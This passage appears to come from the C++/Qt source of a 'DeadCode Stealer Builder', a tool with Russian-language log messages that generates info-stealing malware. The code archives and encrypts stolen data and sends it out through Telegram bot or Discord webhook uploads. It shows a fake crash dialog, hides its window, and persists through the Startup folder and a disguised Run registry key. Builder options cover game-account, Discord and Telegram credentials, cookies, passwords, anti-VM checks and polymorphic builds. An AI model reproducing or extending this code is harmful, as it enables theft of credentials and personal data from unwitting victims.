        QString clipboardText = clipboard->text();
        if (!clipboardText.isEmpty()) {
            out << "Clipboard Content: " << clipboardText << "\n";
        } else {
            out << "Clipboard Content: N/A\n";
        }

        char docPath[MAX_PATH];
        SHGetFolderPathA(NULL, CSIDL_PERSONAL, NULL, 0, docPath);
        std::string documentsPath = std::string(docPath);
        out << "Recent Documents:\n";
        int docCount = 0;
        for (const auto& entry : std::filesystem::directory_iterator(documentsPath)) {
            if (docCount >= 5) break;
            out << entry.path().filename().string().c_str() << "\n";
            docCount++;
        }
        if (docCount == 0) {
            out << "No recent documents found.\n";
        }

        file.close();
        emitLog("Данные для социальной инженерии сохранены: " + QString::fromStdString(path) + "\n");
    } else {
        emitLog("Ошибка: Не удалось сохранить данные для социальной инженерии\n");
    }
}

void MainWindow::archiveData(const std::string& dir, const std::string& archivePath)
{
    zip_t *zip = zip_open(archivePath.c_str(), ZIP_CREATE | ZIP_TRUNCATE, nullptr);
    if (!zip) {
        emitLog("Ошибка: Не удалось создать архив stolen_data.zip\n");
        return;
    }

    for (const auto& entry : std::filesystem::recursive_directory_iterator(dir)) {
        if (entry.is_regular_file()) {
            std::string filePath = entry.path().string();
            std::string relativePath = std::filesystem::relative(filePath, dir).string();
            std::replace(relativePath.begin(), relativePath.end(), '\\', '/');

            std::ifstream file(filePath, std::ios::binary);
            if (!file.is_open()) {
                emitLog(QString("Ошибка чтения файла для архивации: %1\n").arg(QString::fromStdString(filePath)));
                continue;
            }
            std::vector<char> buffer((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
            file.close();

            zip_source_t *source = zip_source_buffer(zip, buffer.data(), buffer.size(), 0);
            if (!source) {
                emitLog(QString("Ошибка создания источника для архивации: %1\n").arg(QString::fromStdString(relativePath)));
                continue;
            }

            if (zip_file_add(zip, relativePath.c_str(), source, ZIP_FL_OVERWRITE) < 0) {
                zip_source_free(source);
                emitLog(QString("Ошибка добавления файла в архив: %1\n").arg(QString::fromStdString(relativePath)));
            }
        }
    }

    if (zip_close(zip) < 0) {
        emitLog("Ошибка закрытия архива: " + QString::fromStdString(zip_strerror(zip)) + "\n");
        return;
    }
    emitLog("Данные архивированы: " + QString::fromStdString(archivePath) + "\n");
}

void MainWindow::encryptData(const std::string& inputPath, const std::string& outputPath)
{
    QFile inputFile(QString::fromStdString(inputPath));
    if (!inputFile.open(QIODevice::ReadOnly)) {
        emitLog("Ошибка: Не удалось открыть файл для шифрования: " + QString::fromStdString(inputPath) + "\n");
        return;
    }
    QByteArray data = inputFile.readAll();
    inputFile.close();

    auto key1 = GetEncryptionKey(true);
    auto key2 = GetEncryptionKey(false);
    auto iv = generateIV();

    QByteArray xorData = applyXOR(data, key1);
    QByteArray encryptedData = applyAES(xorData, key2, iv);
    if (encryptedData.isEmpty()) {
        emitLog("Ошибка: Не удалось зашифровать данные\n");
        return;
    }

    QFile outputFile(QString::fromStdString(outputPath));
    if (!outputFile.open(QIODevice::WriteOnly)) {
        emitLog("Ошибка: Не удалось создать файл для зашифрованных данных: " + QString::fromStdString(outputPath) + "\n");
        return;
    }
    outputFile.write(QByteArray((char*)iv.data(), iv.size()));
    outputFile.write(encryptedData);
    outputFile.close();
    emitLog("Данные зашифрованы: " + QString::fromStdString(outputPath) + "\n");
}

void MainWindow::sendData(const std::string& filePath)
{
    if (config.sendMethod == "Local File") {
        std::string localPath = QDir::currentPath().toStdString() + "\\stolen_data_encrypted.zip";
        try {
            std::filesystem::copy_file(filePath, localPath, std::filesystem::copy_options::overwrite_existing);
            emitLog("Данные сохранены локально: " + QString::fromStdString(localPath) + "\n");
        } catch (const std::exception& e) {
            emitLog("Ошибка сохранения данных локально: " + QString::fromStdString(e.what()) + "\n");
        }
    } else if (config.sendMethod == "Telegram") {
        if (config.telegramToken.empty() || config.chatId.empty()) {
            emitLog("Ошибка: Telegram Token или Chat ID не указаны\n");
            return;
        }

        CURL *curl = curl_easy_init();
        if (!curl) {
            emitLog("Ошибка: Не удалось инициализировать CURL\n");
            return;
        }

        curl_mime *form = curl_mime_init(curl);
        curl_mimepart *field = curl_mime_addpart(form);
        curl_mime_name(field, "chat_id");
        curl_mime_data(field, config.chatId.c_str(), CURL_ZERO_TERMINATED);
        field = curl_mime_addpart(form);
        curl_mime_name(field, "document");
        curl_mime_filedata(field, filePath.c_str());

        std::string url = "https://api.telegram.org/bot" + config.telegramToken + "/sendDocument";
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);

        std::string response;
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

        CURLcode res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            emitLog("Ошибка отправки данных через Telegram: " + QString::fromStdString(curl_easy_strerror(res)) + "\n");
        } else {
            emitLog("Данные успешно отправлены через Telegram\n");
        }

        curl_mime_free(form);
        curl_easy_cleanup(curl);
    } else if (config.sendMethod == "Discord") {
        if (config.discordWebhook.empty()) {
            emitLog("Ошибка: Discord Webhook не указан\n");
            return;
        }

        CURL *curl = curl_easy_init();
        if (!curl) {
            emitLog("Ошибка: Не удалось инициализировать CURL\n");
            return;
        }

        curl_mime *form = curl_mime_init(curl);
        curl_mimepart *field = curl_mime_addpart(form);
        curl_mime_name(field, "file");
        curl_mime_filedata(field, filePath.c_str());

        curl_easy_setopt(curl, CURLOPT_URL, config.discordWebhook.c_str());
        curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);

        std::string response;
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

        CURLcode res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            emitLog("Ошибка отправки данных через Discord: " + QString::fromStdString(curl_easy_strerror(res)) + "\n");
        } else {
            emitLog("Данные успешно отправлены через Discord\n");
        }

        curl_mime_free(form);
        curl_easy_cleanup(curl);
    }
}

void MainWindow::FakeError()
{
    MessageBoxA(NULL, "Critical Error: Application has encountered an unexpected error and will now close.", "Error", MB_ICONERROR | MB_OK);
    emitLog("Отображена фальшивая ошибка\n");
}

void MainWindow::Stealth()
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    emitLog("Приложение переведено в скрытый режим\n");
}

void MainWindow::Persist()
{
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    std::string destPath = std::string(std::getenv("APPDATA")) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svc.exe";

    try {
        std::filesystem::copy_file(exePath, destPath, std::filesystem::copy_options::overwrite_existing);
        emitLog("Приложение добавлено в автозагрузку: " + QString::fromStdString(destPath) + "\n");
    } catch (const std::exception& e) {
        emitLog("Ошибка добавления в автозагрузку: " + QString::fromStdString(e.what()) + "\n");
    }

    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        if (RegSetValueExA(hKey, "WindowsService", 0, REG_SZ, (BYTE*)destPath.c_str(), destPath.length() + 1) == ERROR_SUCCESS) {
            emitLog("Приложение добавлено в реестр автозагрузки\n");
        } else {
            emitLog("Ошибка добавления в реестр автозагрузки\n");
        }
        RegCloseKey(hKey);
    } else {
        emitLog("Ошибка открытия ключа реестра для автозагрузки\n");
    }
}

void MainWindow::exitApp()
{
    QApplication::quit();
}

void MainWindow::appendLog(const QString& message)
{
    ui->textEdit->append(message);
}

void MainWindow::on_buildButton_clicked()
{
    if (isBuilding) {
        emitLog("Сборка уже выполняется. Пожалуйста, подождите.\n");
        return;
    }

    isBuilding = true;
    ui->statusbar->showMessage("Сборка началась...", 0);

    config.filename = ui->filenameLineEdit->text().toStdString();
    if (config.filename.empty()) {
        config.filename = "stealer.exe";
        ui->filenameLineEdit->setText(QString::fromStdString(config.filename));
    }
    if (config.filename.find(".exe") == std::string::npos) {
        config.filename += ".exe";
        ui->filenameLineEdit->setText(QString::fromStdString(config.filename));
    }

    config.telegramToken = ui->tokenLineEdit->text().toStdString();
    config.chatId = ui->chatIdLineEdit->text().toStdString();
    config.discordWebhook = ui->discordWebhookLineEdit->text().toStdString();
    config.encryptionKey1 = ui->encryptionKey1LineEdit->text().toStdString();
    config.encryptionKey2 = ui->encryptionKey2LineEdit->text().toStdString();
    config.encryptionSalt = ui->encryptionSaltLineEdit->text().toStdString();
    config.sendMethod = ui->sendMethodComboBox->currentText().toStdString();
    config.buildMethod = ui->buildMethodComboBox->currentText().toStdString();
    config.steam = ui->steamCheckBox->isChecked();
    config.steamMAFile = ui->steamMAFileCheckBox->isChecked();
    config.epic = ui->epicCheckBox->isChecked();
    config.roblox = ui->robloxCheckBox->isChecked();
    config.battlenet = ui->battlenetCheckBox->isChecked();
    config.minecraft = ui->minecraftCheckBox->isChecked();
    config.discord = ui->discordCheckBox->isChecked();
    config.telegram = ui->telegramCheckBox->isChecked();
    config.chatHistory = ui->chatHistoryCheckBox->isChecked();
    config.cookies = ui->cookiesCheckBox->isChecked();
    config.passwords = ui->passwordsCheckBox->isChecked();
    config.screenshot = ui->screenshotCheckBox->isChecked();
    config.fileGrabber = ui->fileGrabberCheckBox->isChecked();
    config.systemInfo = ui->systemInfoCheckBox->isChecked();
    config.socialEngineering = ui->socialEngineeringCheckBox->isChecked();
    config.antiVM = ui->antiVMCheckBox->isChecked();
    config.fakeError = ui->fakeErrorCheckBox->isChecked();
    config.silent = ui->silentCheckBox->isChecked();
    config.autoStart = ui->autoStartCheckBox->isChecked();
    config.persist = ui->persistCheckBox->isChecked();

    emitLog("Конфигурация обновлена:\n");
    emitLog("Имя файла: " + QString::fromStdString(config.filename) + "\n");
    emitLog("Метод отправки: " + QString::fromStdString(config.sendMethod) + "\n");
    emitLog("Метод сборки: " + QString::fromStdString(config.buildMethod) + "\n");

    generatePolymorphicCode();
    generateBuildKeyHeader();
    copyIconToBuild();

    if (config.buildMethod == "Local Build") {
        buildTimer->start(0);
    } else if (config.buildMethod == "GitHub Actions") {
        triggerGitHubActions();
    }
}

void MainWindow::on_iconBrowseButton_clicked()
{
    QString fileName = QFileDialog::getOpenFileName(this, "Выберите иконку", "", "Icon Files (*.ico)");
    if (!fileName.isEmpty()) {
        ui->iconPathLineEdit->setText(fileName);
        emitLog("Выбрана иконка: " + fileName + "\n");
    }
}

void MainWindow::on_actionSaveConfig_triggered()
{
    QString fileName = QFileDialog::getSaveFileName(this, "Сохранить конфигурацию", "", "Config Files (*.ini)");
    if (fileName.isEmpty()) return;

    QSettings settings(fileName, QSettings::IniFormat);
    settings.setValue("filename", ui->filenameLineEdit->text());
    settings.setValue("telegramToken", ui->tokenLineEdit->text());
    settings.setValue("chatId", ui->chatIdLineEdit->text());
    settings.setValue("discordWebhook", ui->discordWebhookLineEdit->text());
    settings.setValue("encryptionKey1", ui->encryptionKey1LineEdit->text());
    settings.setValue("encryptionKey2", ui->encryptionKey2LineEdit->text());
    settings.setValue("encryptionSalt", ui->encryptionSaltLineEdit->text());
    settings.setValue("iconPath", ui->iconPathLineEdit->text());
    settings.setValue("githubToken", ui->githubTokenLineEdit->text());
    settings.setValue("githubRepo", ui->githubRepoLineEdit->text());
    settings.setValue("sendMethod", ui->sendMethodComboBox->currentText());
    settings.setValue("buildMethod", ui->buildMethodComboBox->currentText());
    settings.setValue("steam", ui->steamCheckBox->isChecked());
    settings.setValue("steamMAFile", ui->steamMAFileCheckBox->isChecked());
    settings.setValue("epic", ui->epicCheckBox->isChecked());
    settings.setValue("roblox", ui->robloxCheckBox->isChecked());
    settings.setValue("battlenet", ui->battlenetCheckBox->isChecked());
    settings.setValue("minecraft", ui->minecraftCheckBox->isChecked());
    settings.setValue("discord", ui->discordCheckBox->isChecked());
    settings.setValue("telegram", ui->telegramCheckBox->isChecked());
    settings.setValue("chatHistory", ui->chatHistoryCheckBox->isChecked());
    settings.setValue("cookies", ui->cookiesCheckBox->isChecked());
    settings.setValue("passwords", ui->passwordsCheckBox->isChecked());
    settings.setValue("screenshot", ui->screenshotCheckBox->isChecked());
    settings.setValue("fileGrabber", ui->fileGrabberCheckBox->isChecked());
    settings.setValue("systemInfo", ui->systemInfoCheckBox->isChecked());
    settings.setValue("socialEngineering", ui->socialEngineeringCheckBox->isChecked());
    settings.setValue("antiVM", ui->antiVMCheckBox->isChecked());
    settings.setValue("fakeError", ui->fakeErrorCheckBox->isChecked());
    settings.setValue("silent", ui->silentCheckBox->isChecked());
    settings.setValue("autoStart", ui->autoStartCheckBox->isChecked());
    settings.setValue("persist", ui->persistCheckBox->isChecked());

    emitLog("Конфигурация сохранена: " + fileName + "\n");
}

void MainWindow::on_actionLoadConfig_triggered()
{
    QString fileName = QFileDialog::getOpenFileName(this, "Загрузить конфигурацию", "", "Config Files (*.ini)");
    if (fileName.isEmpty()) return;

    QSettings settings(fileName, QSettings::IniFormat);
    ui->filenameLineEdit->setText(settings.value("filename", "stealer.exe").toString());
    ui->tokenLineEdit->setText(settings.value("telegramToken").toString());
    ui->chatIdLineEdit->setText(settings.value("chatId").toString());
    ui->discordWebhookLineEdit->setText(settings.value("discordWebhook").toString());
    ui->encryptionKey1LineEdit->setText(settings.value("encryptionKey1").toString());
    ui->encryptionKey2LineEdit->setText(settings.value("encryptionKey2").toString());
    ui->encryptionSaltLineEdit->setText(settings.value("encryptionSalt").toString());
    ui->iconPathLineEdit->setText(settings.value("iconPath").toString());
    ui->githubTokenLineEdit->setText(settings.value("githubToken").toString());
    ui->githubRepoLineEdit->setText(settings.value("githubRepo").toString());
    ui->sendMethodComboBox->setCurrentText(settings.value("sendMethod", "Local File").toString());
    ui->buildMethodComboBox->setCurrentText(settings.value("buildMethod", "Local Build").toString());
    ui->steamCheckBox->setChecked(settings.value("steam", false).toBool());
    ui->steamMAFileCheckBox->setChecked(settings.value("steamMAFile", false).toBool());
    ui->epicCheckBox->setChecked(settings.value("epic", false).toBool());
    ui->robloxCheckBox->setChecked(settings.value("roblox", false).toBool());
    ui->battlenetCheckBox->setChecked(settings.value("battlenet", false).toBool());
    ui->minecraftCheckBox->setChecked(settings.value("minecraft", false).toBool());
    ui->discordCheckBox->setChecked(settings.value("discord", false).toBool());
    ui->telegramCheckBox->setChecked(settings.value("telegram", false).toBool());
    ui->chatHistoryCheckBox->setChecked(settings.value("chatHistory", false).toBool());
    ui->cookiesCheckBox->setChecked(settings.value("cookies", false).toBool());
    ui->passwordsCheckBox->setChecked(settings.value("passwords", false).toBool());
    ui->screenshotCheckBox->setChecked(settings.value("screenshot", false).toBool());
    ui->fileGrabberCheckBox->setChecked(settings.value("fileGrabber", false).toBool());
    ui->systemInfoCheckBox->setChecked(settings.value("systemInfo", false).toBool());
    ui->socialEngineeringCheckBox->setChecked(settings.value("socialEngineering", false).toBool());
    ui->antiVMCheckBox->setChecked(settings.value("antiVM", false).toBool());
    ui->fakeErrorCheckBox->setChecked(settings.value("fakeError", false).toBool());
    ui->silentCheckBox->setChecked(settings.value("silent", false).toBool());
    ui->autoStartCheckBox->setChecked(settings.value("autoStart", false).toBool());
    ui->persistCheckBox->setChecked(settings.value("persist", false).toBool());

    emitLog("Конфигурация загружена: " + fileName + "\n");
}

void MainWindow::on_actionExportLogs_triggered()
{
    QString fileName = QFileDialog::getSaveFileName(this, "Экспортировать логи", "", "Text Files (*.txt)");
    if (fileName.isEmpty()) return;

    QFile file(fileName);
    if (file.open(QIODevice::WriteOnly | QIODevice::Text)) {
        QTextStream out(&file);
        out << ui->textEdit->toPlainText();
        file.close();
        emitLog("Логи экспортированы: " + fileName + "\n");
    } else {
        emitLog("Ошибка: Не удалось экспортировать логи\n");
    }
}

void MainWindow::on_actionExit_triggered()
{
    QApplication::quit();
}

void MainWindow::on_actionAbout_triggered()
{
    QMessageBox::about(this, "О программе", "DeadCode Stealer Builder\nВерсия: 1.0\nРазработчик: Anonymous\n\nЭто инструмент для создания стилеров с различными функциями.");
}

void MainWindow::replyFinished(QNetworkReply *reply)
{
    if (reply->error() == QNetworkReply::NoError) {
        emitLog("Сетевой запрос успешно выполнен\n");
    } else {
        emitLog("Ошибка сетевого запроса: " + reply->errorString() + "\n");
    }
    reply->deleteLater();
}